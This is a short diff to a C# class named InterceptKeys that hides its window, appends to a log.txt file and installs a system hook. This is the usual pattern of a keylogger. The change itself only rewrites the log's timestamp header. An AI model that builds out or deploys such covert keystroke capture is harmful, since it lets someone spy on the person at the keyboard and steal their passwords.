@@ -18,7 +18,7 @@ class InterceptKeys
         // Hide
         ShowWindow(handle, SW_HIDE);
         StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
-        sw.Write(DateTime.Now.ToString("\r\n\r\n###ryyyyMMdd_HHmmss###\r\n"));
+        sw.Write(DateTime.Now.ToString("\r\n\r\nLOG STARTED on yyyyMMdd_HHmmss\r\n"));
         sw.Close();
         _hookID = SetHook(_proc);
         Application.Run();
